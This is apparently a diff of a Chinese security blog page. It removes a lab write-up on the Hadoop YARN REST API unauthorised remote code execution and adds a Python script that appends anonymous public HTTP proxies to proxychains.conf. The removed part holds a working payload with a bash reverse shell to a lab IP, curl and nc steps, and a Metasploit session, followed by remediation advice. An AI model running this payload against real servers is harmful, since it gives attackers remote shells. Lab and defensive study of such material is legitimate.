@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Hadoop | Mr.Frame</title>
-  <meta name="keywords" content=" aa ">
-  <meta name="description" content="Hadoop | Mr.Frame">
+  <title>getHttpProxy | Mr.Frame</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="getHttpProxy | Mr.Frame">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="function doDecrypt (pwd, onError) { 	console.log(&#39;in doDecrypt&#39;); 	const txt &#x3D; document.getElementById(&#39;enc_content&#39;).innerHTML; 	let plantext; 	try { 		const bytes &#x3D; CryptoJS.AES.decrypt(txt, pwd);">
 <meta property="og:type" content="website">
@@ -751,9 +751,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Hadoop" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-getHttpProxy" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Hadoop</h1>
+        <h1 class="article-title">getHttpProxy</h1>
     
     <div class="article-meta">
         
@@ -763,29 +763,20 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Kali">Kali</a> > 
-            
-            <a  data-rel="Kali&lt;---&gt;Exploit">Exploit</a>
+            <a  data-rel="Coding">Coding</a>
             
         </span>
         
         
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color3">aa</a>
-            
-        </span>
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2021-03-17 17:12:28'>2021-03-17 17:12</time>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-12-04 20:23:31'>2020-12-04 20:23</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        <span>Count:878</span>
+        <span>Count:333</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -815,7 +806,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hadoop-Yarn%EF%BC%88ResourceManager-REST-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-text">Hadoop Yarn（ResourceManager REST API)未授权漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%88%96BP%E6%B5%8B%E8%AF%95"><span class="toc-text">手工或BP测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E6%B5%8B%E8%AF%95"><span class="toc-text">MSF测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE%EF%BC%9A"><span class="toc-text">修复建议：</span></a></li></ol></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -831,114 +822,80 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Hadoop是一个Apache基金会所开发的分布式基础架构， 核心设计是<code>HDFS</code>（即分布式文件系统）和<code>MapReduce</code>， * HDFS 为海量数据提供存储 * MapReduce为海量数据提供计算</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">sudo nmap -sV -Pn -T4 -sSU -p 8088 -sC    192.168.79.207
+        <p>编写进度</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> </li>
+</ul>
+<p>在github上发现一个自动更新的http代理的仓库<img src="https://github.com/fate0/proxylist" alt="fate0"></p>
+<p>因此编写了一个python脚本自动获取并添加到proxychains.conf配置文件中</p>
+<p><img src="https://github.com/askDing/socks5_list" alt="getHttp.py"></p>
+<pre><code class="python">#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# Wed Mar 17 16:39:04 CST 2021
+# AUTHOR: Mr.Frame 
+# Description:
+#      自动获取http代理，并添加到proxychains.conf中
+#Usage:
+#      python3 gethttp.py  [/path/to/proxychains.conf]
 
-Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 18:32 CST
-Nmap scan report for 192.168.79.207
-Host is up (0.00012s latency).
 
-PORT     STATE  SERVICE    VERSION
-8088/tcp open   http       Jetty 6.1.26
-|_http-server-header: Jetty(6.1.26)
-| http-title:     All Applications
-|_Requested resource was http://192.168.79.207:8088/cluster
-8088/udp closed radan-http
 
-Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds</code></pre>
-<h2 id="Hadoop-Yarn（ResourceManager-REST-API-未授权漏洞"><a href="#Hadoop-Yarn（ResourceManager-REST-API-未授权漏洞" class="headerlink" title="Hadoop Yarn（ResourceManager REST API)未授权漏洞"></a>Hadoop Yarn（ResourceManager REST API)未授权漏洞</h2><p>YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当， 攻击者利用Hadoop Yarn资源管理系统REST API未授权漏洞对服务器进行远程执行代码。</p>
-<h3 id="手工或BP测试"><a href="#手工或BP测试" class="headerlink" title="手工或BP测试"></a>手工或BP测试</h3><p>Payload</p>
-<pre><code>POST /ws/v1/cluster/apps HTTP/1.1
-Host: 127.0.0.1:8088
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Content-Type: application/json
-Content-Length: 268
 
-&#123;
-   &quot;application-id&quot;:&quot;application_1604979684298_0006&quot;,
-    &quot;application-name&quot;:&quot;test&quot;,
-    &quot;application-type&quot;:&quot;YARN&quot;,
-    &quot;am-container-spec&quot;:&#123;
-        &quot;commands&quot;:&#123;
-            &quot;command&quot;:&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.79.28/9999  0&gt;&amp;1&quot;
+import requests
+import urllib3
+import json
 
-        &#125;
+
+def get_socks5(proxychains_path):
+    &quot;&quot;&quot;
+    get socks from http://proxylist.fatezero.org/proxy.list.
+    proxychains_path: str -&gt; the path of proxycahins-ng configuation file.
+    ***suggestion:   enable  round_robin_chain****
+    #strict_chain
+    #dynamic_chain
+    #round_robin_chain
+    random_chain
+    chain_len = 2
+    &quot;&quot;&quot;
+
+    proxychains_file = proxychains_path
+
+    url=&quot;http://proxylist.fatezero.org/proxy.list&quot;
+    headers=&#123;
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot;
     &#125;
 
-&#125;</code></pre>
-<p><img src="../images/hadoop-1.png" alt="hadoop-1"></p>
-<ol>
-<li> 申请新的application，记录<code>application-id</code>字段 直接通过curl进行POST请求</li>
-</ol>
-<pre><code>curl -v -X POST &#39;http://ip:8088/ws/v1/cluster/apps/new-application&#39;
-返回包含如下信息
-&#123;&quot;application-id&quot;:&quot;application_1527144634877_20465&quot;,&quot;maximum-resource-capability&quot;:&#123;&quot;memory&quot;:16384,&quot;vCores&quot;:8&#125;&#125;</code></pre>
-<ol start="2">
-<li> 使用nc监听9999端口 <code>nc -lvvp 9999</code></li>
-<li> 直接发送构造好的payload</li>
-</ol>
-<pre><code>curl -s -i -X POST -H &#39;Accept: application/json&#39; -H &#39;Content-Type: application/json&#39; http://ip:8088/ws/v1/cluster/apps --data-binary @1.json</code></pre>
-<p>1.json文件中的内容</p>
-<pre><code class="text">&#123;
-    &quot;am-container-spec&quot;:&#123;
-        &quot;commands&quot;:&#123;
-            &quot;command&quot;:&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.79.28/9999  0&gt;&amp;1&quot;
+    urllib3.disable_warnings() # 关闭ssl警告
+    try:
+        response = requests.get(url=url,headers=headers,verify=False,timeout=2)
+    except Exception as e:
+        print(&quot;\033[31m[x]Connection failed\033[0m&quot;)
+        print(e.__str__())
+        exit()
 
-        &#125;
-    &#125;,
-    &quot;application-id&quot;:&quot;application_1527144634877_20465&quot;,
-    &quot;application-name&quot;:&quot;test&quot;,
-    &quot;application-type&quot;:&quot;YARN&quot;
-&#125;</code></pre>
-<h3 id="MSF测试"><a href="#MSF测试" class="headerlink" title="MSF测试"></a>MSF测试</h3><pre><code>msf6 exploit(linux/http/hadoop_unauth_exec) &gt; show options
+    if response.status_code == 200 :
+        proxy_list = response.text.splitlines()
+        socks_list=&quot;\n\n# socks5 list from  http://proxylist.fatezero.org/proxy.list\n&quot;
+        for item in proxy_list:
+            item_dict = json.loads(item)
 
-Module options (exploit/linux/http/hadoop_unauth_exec):
+            if &quot;http&quot; == item_dict[&#39;type&#39;] and &quot;high_anonymous&quot; == item_dict[&#39;anonymity&#39;]:
+                socks_item = item_dict[&#39;type&#39;] +&quot;\t&quot; + item_dict[&#39;host&#39;] + &quot;\t&quot; + str(item_dict[&#39;port&#39;])+&quot;\n&quot;
+                socks_list += socks_item
+            print(socks_list)
 
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS   127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
-   RPORT    8088             yes       The target port (TCP)
-   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT  8080             yes       The local port to listen on.
-   SSL      false            no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
-   URIPATH                   no        The URI to use for this exploit (default is random)
-   VHOST                     no        HTTP server virtual host
+        # with open(&quot;/usr/local/etc/proxychains.conf&quot;,&#39;a+&#39;) as f:
+        with open(proxychains_file,&quot;a+&quot;) as f:
+            f.write(socks_list)
 
 
-Payload options (linux/x64/meterpreter/reverse_tcp):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.79.28    yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-
-msf6 exploit(linux/http/hadoop_unauth_exec) &gt; run
-
-[*] Started reverse TCP handler on 192.168.79.28:4444
-[*] Sending Command
-[*] Command Stager progress - 100.00% done (823/823 bytes)
-[*] Sending stage (3008420 bytes) to 192.168.79.28
-[*] Meterpreter session 2 opened (192.168.79.28:4444 -&gt; 192.168.79.28:63414) at 2020-11-10 15:44:07 +0800
-
-meterpreter &gt;</code></pre>
-<h3 id="修复建议："><a href="#修复建议：" class="headerlink" title="修复建议："></a>修复建议：</h3><ul>
-<li>如无必要，关闭Hadoop Web管理页面；</li>
-<li>开启服务级别身份验证，如Kerberos认证；</li>
-<li>部署Knox、Nginx之类的反向代理系统，防止未经授权用户访问；</li>
-<li>限制可信任的IP地址才能访问Hadoop默认开放的多个端口</li>
-</ul>
+if __name__ == &#39;__main__&#39;:
+    import sys
+    if sys.argv.__len__() == 1:
+        get_socks5(&quot;/usr/local/etc/proxychains.conf&quot;)
+    else:
+        get_socks5(sys.argv[1])
+</code></pre>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 askding@qq.com </span>
